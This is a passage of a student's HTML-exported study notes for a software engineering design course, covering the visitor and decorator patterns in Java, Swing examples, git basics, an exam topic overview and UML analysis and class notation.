}</code></pre><h3 id="88e212d3-7177-4692-aa4a-6b8abe5c9d94" class="">PropagatorVisitor</h3><p id="4f0c0d95-d606-4281-b9fe-8948ffcf1ddb" class="">a type of visitor that returns a boolean to to interrupt the visit early</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9b3a4c89-b3cf-4f1b-ba36-9f1375c81cfc" class="code"><code class="language-Java">class PropagatorVisitor implements Visitor&lt;Boolean&gt;{
 //return false == continue the visit
 public Boolean visitP(P e){ return false; }
 public Boolean visitDiv(Div e){ return any(e.ns(),ei-&gt;ei.accept(this)); }
 public Boolean visitA(A e){ return false; }
 public Boolean visitUl(Ul e){ return any(e.lis(),ei-&gt;visitLi(ei)); }
 public Boolean visitLi(Li e){ return e.node().accept(this); }
 
 public static &lt;T extends Node&gt; Boolean any(List&lt;T&gt; ts, Predicate&lt;T&gt; test){
		 return ts.stream().anyMatch(test);//short-circuit on true
 }
}</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a057802e-e0cf-40fe-91ed-9030210ef026" class="code"><code class="language-Java">class CollectAllText2 extends PropagatorVisitor{
	 //better version of CollectAllText
	 public String collect(Node n){
			 //usage new CollectAllText2().collect(myNode)
			 n.accept(this);
			 return allText;
	 }
	 private String allText= &quot;&quot;;
			 public Node visitP(P e){
			 allText += e.text();
			 return super.visitP(e);
	 }
}
class ContainsItalian extends PropagatorVisitor{
	 //usage new ContainsItalian().check(myNode)
	 public boolean check(Node n){ return n.accept(this); }
	 public Node visitP(P e){ return e.text().contains(&quot;Pizza&quot;); }
}

//Using PropagatorVisitor
//In some cases, extending PropagatorVisitor is
//is more efficient than just extending CloneVisitor</code></pre></details></li></ul><ul id="c8cca55b-5f67-4a65-9b2a-ffcf57e663db" class="toggle"><li><details><summary>Decorator pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="c7c871ed-e0f3-45fe-82c3-641bdf8ea1f5"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="a496da56-6085-4c8e-b4e8-0269fe575208" class="">an object that wraps another object to modify/enhance behavior</p><figure id="9a5044a3-e2cf-4fb5-b5ee-d9a3b1cafab8" class="image"><a href="Untitled%2010.png"><img style="width:190.57778930664062px" src="Untitled%2010.png"/></a><figcaption>Define component interface for each case<br/>Concrete component classes implement this interface<br/>Decorator classes also implement this interface<br/>Decorator object manages component object it decorates<br/></figcaption></figure><ul id="4e80b524-7b91-4e2e-8e4e-b051cd9dab64" class="bulleted-list"><li style="list-style-type:disc">kind of like a composite with exactly 1 non-null child object</li></ul><ul id="9bac09ee-f5e5-45d1-b763-ece2f1e5a35c" class="bulleted-list"><li style="list-style-type:disc">decorator prevents class explosion</li></ul><ul id="45128dbe-68e6-4bbc-a1ac-fbd64f77ac23" class="bulleted-list"><li style="list-style-type:disc">alters behavior transparently, no need to edit code of the concrete type</li></ul><ul id="aa1dc3b8-52b9-4674-8bfb-6b0ee07028f6" class="bulleted-list"><li style="list-style-type:disc">behavior can change dynamically</li></ul></div></figure><h3 id="b2e227a2-8877-4b2c-ba6f-43fd800a66be" class="">Swing Scroll Bars</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6df9ec25-a040-4f03-93f4-611d7f936da3" class="code"><code class="language-Java">JComponent scrollTextArea(){
	 JTextArea jta= new JTextArea(); //text area (component)
	 
	 //we want to make the text are scrollable
	 //wrap the text area with a scroll pannel (decorator)
	 JScrollPane scrollPane= new JScrollPane(jta, 
					 ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS,
					 ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
					 
	 scrollPane.setPreferredSize(new Dimension(100, 100));
	 //prefered size of the internal and external are not unconnected
	 return scrollPane;
}</code></pre><h3 id="e0b3b8bf-7aca-484e-844b-f0e876ed2a9d" class="">Swing Boarder</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="86423234-151f-41da-ba74-95bf52a83f39" class="code"><code class="language-Java">//swing boarders don&#x27;t use decorator, uses strategy
JComponent borderedButton(){
	 JComponent p= new JPanel();
	 Border b0= BorderFactory.createTitledBorder(&quot;Foo&quot;);
	 p.setBorder(b0);
	 p.add(new JButton(myImg));
	 return p;
}

//swing boarders with titles use both strategy and decorator
JComponent borderedButton(){
	 JComponent p= new JPanel();
	 Border b0= BorderFactory.createLoweredBevelBorder();
	 b0= BorderFactory.createTitledBorder(b0,&quot;Bar&quot;);
	 p.setBorder(b0);
	 p.add(new JButton(myImg));
	 return p;
 }
</code></pre><p id="b80c02a7-aa7a-491a-9fd3-b5ed4e74aabc" class="">
</p></details></li></ul></details></li></ul><ul id="1141a926-7344-8015-bdcc-faa786afbf25" class="toggle"><li><details><summary>Final Exam</summary><figure id="11c1a926-7344-8087-908a-d5915a177bed"><a href="https://nuku.wgtn.ac.nz/courses/18886/files/3447363?wrap=1" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title"></div></div><div class="bookmark-href">https://nuku.wgtn.ac.nz/courses/18886/files/3447363?wrap=1</div></div></a></figure><figure id="11c1a926-7344-8029-b71f-e9b0f91e347f"><a href="https://nuku.wgtn.ac.nz/courses/18886/files/3447361?wrap=1" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title"></div></div><div class="bookmark-href">https://nuku.wgtn.ac.nz/courses/18886/files/3447361?wrap=1</div></div></a></figure><figure id="1251a926-7344-80f0-961a-fd1efd1f233e"><a href="https://ecs.wgtn.ac.nz/Main/ExamArchiveSWEN225" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Exam Archive SWEN 225 | Te Kura Mātai Pūkaha, Pūrorohiko / School of Engineering and Computer Science | Te Herenga Waka—Victoria University of Wellington</div></div><div class="bookmark-href"><img src="https://ecs.wgtn.ac.nz/favicon.ico" class="icon bookmark-icon"/>https://ecs.wgtn.ac.nz/Main/ExamArchiveSWEN225</div></div></a></figure><ul id="1141a926-7344-8053-90e2-e96a036f2bc1" class="toggle"><li><details><summary>Overview</summary><ul id="1141a926-7344-8065-a486-eccf40d0f626" class="bulleted-list"><li style="list-style-type:disc">Git (20 marks)<ul id="1221a926-7344-8066-b9af-e6e936aa42f6" class="bulleted-list"><li style="list-style-type:circle">git revision control: github, lab, gui, cli</li></ul><ul id="1221a926-7344-8009-9673-c4c8d1c594f2" class="bulleted-list"><li style="list-style-type:circle">status</li></ul><ul id="1221a926-7344-8038-b0a2-fd7305718477" class="bulleted-list"><li style="list-style-type:circle">branch</li></ul><ul id="1221a926-7344-80e4-a93a-c95e2a9b677b" class="bulleted-list"><li style="list-style-type:circle">checkout</li></ul><ul id="1221a926-7344-8092-970d-fc93b6c8ff7b" class="bulleted-list"><li style="list-style-type:circle">push, pull</li></ul><ul id="1221a926-7344-8012-8222-cd07e53f3c00" class="bulleted-list"><li style="list-style-type:circle">save</li></ul><ul id="1221a926-7344-807c-b3a7-cc883815c942" class="bulleted-list"><li style="list-style-type:circle">fork</li></ul><ul id="1221a926-7344-8000-b69e-f0a3bbae2492" class="bulleted-list"><li style="list-style-type:circle">clone</li></ul></li></ul><ul id="1141a926-7344-80de-a1c3-e029c255c27a" class="bulleted-list"><li style="list-style-type:disc">UML (20 marks)</li></ul><ul id="1141a926-7344-8004-ad34-dece7b16dcd4" class="bulleted-list"><li style="list-style-type:disc">design patterns &amp; java (Marco stuff) (40 marks)<ul id="11c1a926-7344-803d-a393-e5f14161d741" class="bulleted-list"><li style="list-style-type:circle">factory method </li></ul><ul id="1221a926-7344-8026-b3c6-e1f846ab6c26" class="bulleted-list"><li style="list-style-type:circle">abstract factory</li></ul><ul id="1221a926-7344-8076-8dc0-f8054647a217" class="bulleted-list"><li style="list-style-type:circle">external itterator</li></ul><ul id="1221a926-7344-8050-91a3-e964192d9d6b" class="bulleted-list"><li style="list-style-type:circle">composite </li></ul><ul id="1221a926-7344-801b-9e5b-c0ac6525690c" class="bulleted-list"><li style="list-style-type:circle">singlton, enums</li></ul><ul id="1221a926-7344-8026-8df4-d8cf44582ca7" class="bulleted-list"><li style="list-style-type:circle">flyweight</li></ul><ul id="1221a926-7344-809d-b35f-dad469107ccd" class="bulleted-list"><li style="list-style-type:circle">observer</li></ul><ul id="1221a926-7344-8013-b094-f9d9db0d2496" class="bulleted-list"><li style="list-style-type:circle">strategy</li></ul><ul id="1221a926-7344-8035-8d7f-d3cecb09f3cb" class="bulleted-list"><li style="list-style-type:circle">state</li></ul><ul id="1221a926-7344-804c-b495-e8a58118cdc7" class="bulleted-list"><li style="list-style-type:circle">adaptor, mocks, dependency injection</li></ul><ul id="1221a926-7344-800b-85d3-dcd8b43c5db0" class="bulleted-list"><li style="list-style-type:circle">MVC</li></ul><ul id="1221a926-7344-80bf-aacd-c9404c9cf4d5" class="bulleted-list"><li style="list-style-type:circle">proxy</li></ul><ul id="1221a926-7344-806a-9983-cbd536606d57" class="bulleted-list"><li style="list-style-type:circle">null object</li></ul><ul id="1221a926-7344-80c0-b780-ebf2d0d2b38c" class="bulleted-list"><li style="list-style-type:circle">OO trees &amp; data structures</li></ul><ul id="1221a926-7344-805b-ac74-cfeff9cf1bf7" class="bulleted-list"><li style="list-style-type:circle">visitor</li></ul><ul id="1221a926-7344-806f-b2e6-fb83521ff93e" class="bulleted-list"><li style="list-style-type:circle">decorator </li></ul><ul id="1221a926-7344-801a-81dd-e0a3a36f4e3c" class="bulleted-list"><li style="list-style-type:circle">anti patterns</li></ul><ul id="1221a926-7344-80d3-9591-ccc1fd4f6d37" class="bulleted-list"><li style="list-style-type:circle">fuzz testing</li></ul><ul id="1221a926-7344-809e-b6d6-e3e40d7dbcf4" class="bulleted-list"><li style="list-style-type:circle">serialization </li></ul><ul id="1221a926-7344-805e-9a84-eeb5bc6fe5dc" class="bulleted-list"><li style="list-style-type:circle">template</li></ul><ul id="1221a926-7344-8012-b9b3-df295d845499" class="bulleted-list"><li style="list-style-type:circle">frameworks</li></ul><ul id="1221a926-7344-808c-ae79-c2bdb2f8bce4" class="bulleted-list"><li style="list-style-type:circle">fluent interface</li></ul><ul id="1221a926-7344-8000-afd1-c1f6d66095ed" class="bulleted-list"><li style="list-style-type:circle">builder pattern</li></ul></li></ul></details></li></ul><ul id="1221a926-7344-80e8-8b21-f29a329c0d4a" class="toggle"><li><details><summary>Git</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1241a926-7344-8038-b27f-c46642fcde99"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="3576290a-71bb-4bce-8632-5eeccdd24842" class="">git is a <mark class="highlight-yellow">version control</mark> system/tool</p><ul id="1241a926-7344-80e6-ae37-f66bc6493158" class="bulleted-list"><li style="list-style-type:disc">team management, time machine, auditing/trace changes</li></ul><ul id="1241a926-7344-801f-836a-e2793f002e81" class="bulleted-list"><li style="list-style-type:disc">git uses <mark class="highlight-yellow">distrusted topology</mark> and the <mark class="highlight-yellow">merge concurrency model</mark><ul id="1241a926-7344-80de-94d1-c8204bea9ebf" class="bulleted-list"><li style="list-style-type:circle">topology: central client-server vs distributed user defined <figure id="1241a926-7344-80e0-b884-dedde6326192" class="image"><a href="Untitled%2011.png"><img style="width:336px" src="Untitled%2011.png"/></a></figure></li></ul><ul id="1241a926-7344-80b7-991e-eb5c5a1e518e" class="bulleted-list"><li style="list-style-type:circle">concurrency control: prevent conflicts (lock) vs deal with conflicts (merge)</li></ul></li></ul><ul id="1241a926-7344-80ca-917b-ef0fe166b093" class="bulleted-list"><li style="list-style-type:disc">although git is distributed (not client-server) it often uses hosting service servers (GitHub, GitLab, GitBucket) </li></ul></div></figure><h3 id="1241a926-7344-80e8-9a34-e1cffac9939e" class="">Commands</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1241a926-7344-809e-ab3e-eaa4d930cede" class="code"><code class="language-Java">git clone &lt;url&gt; //installs project from a hosting service url
git init //initilizes a repository
git status //displays state of the working directory and staging area
git add &lt;file&gt; //adds file to staging
git commit -m &quot;&quot; //commits staged files to local repo
git push -&lt;repo_name&gt; &lt;branch&gt; //push changes local repo changes to remote repo
git pull -&lt;repo_name&gt; &lt;branch //syncs changes from remote repo to local repo
git merge &lt;branch&gt; //merge current branch with another branch 
git branch &lt;branchName&gt; //add or create a new branch
git checkout &lt;branch&gt; //change current branch
git checkout -b &lt;branch&gt; //add and change to new branch</code></pre><h3 id="1241a926-7344-8030-aa97-f3c499a8efe8" class="">Structure</h3><ul id="1241a926-7344-80f8-a096-fc0c18f71deb" class="bulleted-list"><li style="list-style-type:disc"><strong>Working Tree</strong>: local file system</li></ul><ul id="1241a926-7344-80a6-9c3a-e4c375835870" class="bulleted-list"><li style="list-style-type:disc"><strong>Staging Area</strong>: tracked files added ready to be committed</li></ul><ul id="1241a926-7344-802a-b16e-cf337e1c65ec" class="bulleted-list"><li style="list-style-type:disc"><strong>Local Repository</strong>: commits made locally, stored in .git folder</li></ul><ul id="1241a926-7344-80e1-8c67-e576f7a1ba4e" class="bulleted-list"><li style="list-style-type:disc"><strong>Remote Repository</strong>: hosting server</li></ul><figure id="1241a926-7344-8004-93d1-e5573dfed042" class="image"><a href="38e5077c-ac72-47c7-8db0-b79e95038bb2.png"><img style="width:708px" src="38e5077c-ac72-47c7-8db0-b79e95038bb2.png"/></a></figure><h3 id="1241a926-7344-80fb-a9d4-d62e88541b6f" class="">File States</h3><ul id="1241a926-7344-8064-83c9-ee4b57a36784" class="bulleted-list"><li style="list-style-type:disc"><strong>Untracked</strong>: files in the working tree that are not staged or committed</li></ul><ul id="1241a926-7344-804a-bc2b-edd418be0470" class="bulleted-list"><li style="list-style-type:disc"><strong>Staged</strong>: files added to the staging area</li></ul><ul id="1241a926-7344-8065-8e58-c383f3ca9ac4" class="bulleted-list"><li style="list-style-type:disc"><strong>Committed</strong>: files are that tracked by the repository</li></ul><ul id="1241a926-7344-8081-9b5e-e3a5b5201a4a" class="bulleted-list"><li style="list-style-type:disc"><strong>Modified</strong>: changes in tracked files, need to be staged and committed again</li></ul><figure id="1241a926-7344-802a-9213-c7a5adb753e6" class="image"><a href="a5d8a394-bd08-4696-b7bb-f2a6d66e20a5.png"><img style="width:701.0752688172043px" src="a5d8a394-bd08-4696-b7bb-f2a6d66e20a5.png"/></a></figure><h3 id="1241a926-7344-80c5-8680-de4c06100f25" class="">Ignore Files</h3><p id="1241a926-7344-80f3-bd1d-dfd428d6ae30" class="">.ignorefile in the project folder that specifies a list of file names or types to be excluding from staging</p><ul id="1241a926-7344-80a6-b529-ea6b14106778" class="bulleted-list"><li style="list-style-type:disc">compiled code, builds, meta data, IDE files and sensitive information shouldn’t be included in the repository, use ignorefiles to prevent files in the working directory from being tracked by git </li></ul></details></li></ul><ul id="1221a926-7344-80bb-b96f-da0874d66bc2" class="toggle"><li><details><summary>UML (Unified Modeling Language)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1221a926-7344-8022-85ab-d414893e8a9a"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="96eb41c1-0348-4699-b9c8-da03fa7dd976" class="">modeling <mark class="highlight-yellow">notation </mark>standard to <mark class="highlight-yellow">visualize system design</mark></p></div></figure><ul id="1221a926-7344-8019-955a-fed410277f37" class="toggle"><li><details><summary>Modelling &amp; Developmental Phases</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1221a926-7344-80c4-813d-dea426b60e6b"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><ul id="1221a926-7344-80b0-ba22-e9f3ac3f646e" class="bulleted-list"><li style="list-style-type:disc">modelling lets you <mark class="highlight-yellow_background">plan</mark>: <mark class="highlight-yellow_background">anticipate challenges and being prepared</mark> for them. <mark class="highlight-yellow_background">making mistakes while its cheaper</mark> during planning rather than in development</li></ul><ul id="1221a926-7344-8064-bd2d-c6e269924650" class="bulleted-list"><li style="list-style-type:disc">modeling is productive, <mark class="highlight-yellow_background">working at a higher level of abstraction </mark>(modelling) <mark class="highlight-yellow_background">is faster than coding</mark> (lower level) which <mark class="highlight-yellow_background">lets us avoid errors only possible in low levels</mark> and detect errors that are invisible at the low level</li></ul></div></figure><h3 id="1221a926-7344-802c-bc3c-d5f5d5ec159c" class="">Developmental Phases</h3><ol type="1" id="1221a926-7344-80a7-914f-d3ddd9c8c083" class="numbered-list" start="1"><li>analysis: surveys for what the end users wants: non technical people</li></ol><ol type="1" id="1221a926-7344-80ac-9188-e7205992d388" class="numbered-list" start="2"><li>design: planning/discussion how to make the product: software people &amp; solution architects</li></ol><ol type="1" id="1221a926-7344-8098-a45f-c203d3249556" class="numbered-list" start="3"><li>implementation: code the product using designs: software engineers  </li></ol><ul id="1221a926-7344-8003-be14-fbcaf683b090" class="bulleted-list"><li style="list-style-type:disc">UML in analysis and design phases</li></ul><ul id="1221a926-7344-801a-83cc-d2815d030c21" class="bulleted-list"><li style="list-style-type:disc">80% of the time is spent designing, 20% actually developing</li></ul><figure id="1221a926-7344-803c-a1ca-e6f0d17632bb" class="image"><a href="image%201.png"><img style="width:432px" src="image%201.png"/></a></figure><h3 id="1221a926-7344-8082-85fb-e046d8ac64ba" class="">Systematic Approach</h3><p id="1221a926-7344-8092-ad50-f6b5e6d5ebb2" class="">we want a systematic approach due to planning being cheaper than mending</p><ul id="1221a926-7344-80ed-b723-c2469bf478f9" class="bulleted-list"><li style="list-style-type:disc">don’t just do it/hack away because fixing errors found in implementation is harder than during planning</li></ul><figure id="1221a926-7344-8034-b22d-ebea5bc7cf3c" class="image"><a href="image%202.png"><img style="width:624.0625px" src="image%202.png"/></a><figcaption>- waterfall process often fails<br/>- iterative process/agile is better<br/>- incremental is similar and can be good<br/></figcaption></figure><h3 id="1221a926-7344-80db-84de-e5d7836535d2" class="">Development Products</h3><ul id="1221a926-7344-808f-83ce-e33f4ade3746" class="bulleted-list"><li style="list-style-type:disc">Problem statement: analysis <ul id="1221a926-7344-809e-9dd2-f5c6f113d543" class="bulleted-list"><li style="list-style-type:circle">requirement analysis: use cases</li></ul><ul id="1221a926-7344-80f4-92c1-dfb76b4a7cbd" class="bulleted-list"><li style="list-style-type:circle">Domain analysis : conceptual model</li></ul></li></ul><ul id="1221a926-7344-80e6-93f8-f1ded0f81289" class="bulleted-list"><li style="list-style-type:disc">Formal System Model: Architecture design<ul id="1221a926-7344-80a4-8b8f-d31b37d1af8e" class="bulleted-list"><li style="list-style-type:circle">architectural design: package diagram</li></ul></li></ul><ul id="1221a926-7344-80df-903b-fa9ed3a6b250" class="bulleted-list"><li style="list-style-type:disc">System architecture: Detailed Design<ul id="1221a926-7344-8033-8b0c-ffeeae92ef03" class="bulleted-list"><li style="list-style-type:circle">detained design: class/state/activity/interactable diagrams</li></ul></li></ul><ul id="1221a926-7344-80f2-b5bb-db7b97b90e74" class="bulleted-list"><li style="list-style-type:disc">Implementable Design<ul id="1221a926-7344-80ea-a72e-cba400ce3f7c" class="bulleted-list"><li style="list-style-type:circle">programming: code</li></ul><ul id="1221a926-7344-804e-9288-cac8a15a581d" class="bulleted-list"><li style="list-style-type:circle">testing: bug report</li></ul></li></ul><figure id="1221a926-7344-80e0-8a08-fb2b54b98105" class="image"><a href="image%203.png"><img style="width:624.07666015625px" src="image%203.png"/></a></figure><p id="1221a926-7344-8085-a572-d453d421701c" class="">
</p></details></li></ul><ul id="1221a926-7344-803a-af15-db1eb2a2ed29" class="toggle"><li><details><summary>Analysis</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1221a926-7344-805c-be12-db777e53cf72"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="1221a926-7344-80f6-bf61-e94154d689a9" class="">the first step of development, before modeling and implementation</p><p id="1221a926-7344-802a-af11-e67c244231dc" class=""><mark class="highlight-yellow">analysis is needed to understand how to make models</mark></p><ul id="5a4921ff-5231-4739-a032-658ad8769963" class="bulleted-list"><li style="list-style-type:disc">requirements analysis: understand the user’s needs</li></ul><ul id="1221a926-7344-8064-8915-cad0325d824a" class="bulleted-list"><li style="list-style-type:disc">domain analysis: develop domain model with users, validate user understanding and requirements</li></ul><ul id="1221a926-7344-8039-b165-dd0ea7f54993" class="bulleted-list"><li style="list-style-type:disc">analysis is important because identifying system requirements is hard: tech/domain slang, expert knowledge is difficult to access, wrong assumptions, future users only have partial ideas</li></ul></div></figure><h3 id="1221a926-7344-8090-a9d0-d7d7826fe83e" class="">Textual Analysis</h3><ol type="1" id="1221a926-7344-803e-b437-d79048cdace8" class="numbered-list" start="1"><li>read &amp; understand<figure id="1221a926-7344-8045-9990-d3dfa444471b" class="image"><a href="image%204.png"><img style="width:568.125px" src="image%204.png"/></a></figure></li></ol><ol type="1" id="1221a926-7344-80cd-aa5d-f1261f51702f" class="numbered-list" start="2"><li><mark class="highlight-yellow">mark nouns </mark>and <mark class="highlight-yellow">verbs</mark>: convert to singulars<ul id="1251a926-7344-8033-905b-f5ab67625bed" class="bulleted-list"><li style="list-style-type:disc">noun: name, place or thing is an object</li></ul><ul id="1251a926-7344-80dd-9aff-fa2d9a174117" class="bulleted-list"><li style="list-style-type:disc">verb: action is behavior </li></ul><figure id="1221a926-7344-800d-b009-dc78302270cf" class="image"><a href="image%205.png"><img style="width:568.1107788085938px" src="image%205.png"/></a></figure></li></ol><ol type="1" id="1221a926-7344-8056-828a-fd905b9829c3" class="numbered-list" start="3"><li><mark class="highlight-yellow">filter </mark>obvious <mark class="highlight-yellow">things/classes </mark>and <mark class="highlight-yellow">actions/behaviors. </mark>discard irrelevant features<figure id="1221a926-7344-801a-8eff-f8e1f7a2a18c" class="image"><a href="image%206.png"><img style="width:568.125px" src="image%206.png"/></a></figure></li></ol><ol type="1" id="1221a926-7344-8017-8d54-d56e62e8eb06" class="numbered-list" start="4"><li><mark class="highlight-yellow">consolidate </mark>things, actions and names<figure id="1221a926-7344-80e3-a33a-f3eae2774b96" class="image"><a href="image%207.png"><img style="width:624px" src="image%207.png"/></a></figure><figure id="1221a926-7344-805e-83fc-d38d35e7a6dd" class="image"><a href="image%208.png"><img style="width:624.07666015625px" src="image%208.png"/></a></figure></li></ol><figure id="1221a926-7344-8063-bd56-c8b65b08972f" class="image"><a href="image%209.png"><img style="width:624px" src="image%209.png"/></a></figure><p id="1221a926-7344-80bb-8f49-c67ce4825c72" class="">
</p></details></li></ul><ul id="1221a926-7344-80d0-b2a1-c4d39b5ecbc9" class="toggle"><li><details><summary>CRC (Class/Responsibilities/Collaborators)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1221a926-7344-801c-ac1f-ee13260b0b76"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="1a4cb7f3-f088-4f60-8e36-a09683a3addf" class="">OO designs is based on classes, responsibilities and collaborators</p><ul id="1221a926-7344-8083-8a70-d7ce752c672b" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">class</mark>: the type </li></ul><ul id="1221a926-7344-80c7-8475-fa6161db9f2e" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">responsibilities</mark>: what the class knows and what it does at a high level<p id="1221a926-7344-8019-bb7e-def90804e4dc" class="">(not just a single operation)</p></li></ul><ul id="1221a926-7344-8031-bf48-fee9783f97a3" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">collaborators</mark>: what other classes are needed to perform a task or get information</li></ul></div></figure><h3 id="1221a926-7344-809a-985e-f312627b5e92" class="">CRC Cards</h3><figure id="1221a926-7344-80a0-be8e-e59f87116d2d" class="image"><a href="31305fd0-995a-4cc3-aa05-23baf1f92460.png"><img style="width:708px" src="31305fd0-995a-4cc3-aa05-23baf1f92460.png"/></a></figure><figure id="1221a926-7344-809c-adb5-cc4772fe555e" class="image"><a href="d9b3e39f-68ee-4471-b564-8b94bc69d8c3.png"><img style="width:708px" src="d9b3e39f-68ee-4471-b564-8b94bc69d8c3.png"/></a></figure></details></li></ul><ul id="1221a926-7344-80fa-8a20-f0cdc7a9b2f4" class="toggle"><li><details><summary><del>Diagram Types</del></summary><figure class="block-color-red_background callout" style="white-space:pre-wrap;display:flex" id="1231a926-7344-8011-903f-e4b79f9f53f2"><div style="font-size:1.5em"><span class="icon">⚠️</span></div><div style="width:100%"><p id="b288b103-fe13-4913-9148-0eb60e2a222a" class="">only class diagrams are assessed </p></div></figure><figure id="1221a926-7344-8072-9936-ed35b73f747c" class="image"><a href="image%2010.png"><img style="width:624.07666015625px" src="image%2010.png"/></a></figure><ul id="1231a926-7344-80e1-8b59-e453d5af58be" class="bulleted-list"><li style="list-style-type:disc">class diagrams</li></ul><ul id="1231a926-7344-808e-be29-fa3ae8404be9" class="bulleted-list"><li style="list-style-type:disc">object diagrams</li></ul><ul id="1231a926-7344-803c-a6b9-d0b66ec248dd" class="bulleted-list"><li style="list-style-type:disc">state diagrams</li></ul><ul id="1231a926-7344-8056-8a00-c711094e0107" class="bulleted-list"><li style="list-style-type:disc">sequence diagrams</li></ul><ul id="1231a926-7344-8060-9476-ecf1bc9d0be6" class="bulleted-list"><li style="list-style-type:disc">communication diagrams</li></ul></details></li></ul><ul id="1231a926-7344-804b-a5b5-d9c417623d62" class="toggle"><li><details><summary>Diagram Notation</summary><h3 id="1231a926-7344-80cd-8852-c71bb061fa81" class="">Class Specification </h3><figure id="1231a926-7344-8021-8c25-c3543aeda71b" class="image"><a href="02754ff3-f305-40be-b3ae-eee620c1b267.png"><img style="width:524.9469964664311px" src="02754ff3-f305-40be-b3ae-eee620c1b267.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1231a926-7344-804e-890e-edc8d717b2d9" class="code"><code class="language-Java">class Dictionary{
		private Array array; // - array : Array
		public Object get(String key); // + get(key : String) : Object
		public void put(String key, Object obj); // + put(key : String, obj : Object)
		public Integer count(); // + count() : Integer
		// / isEmpty() : Boolean
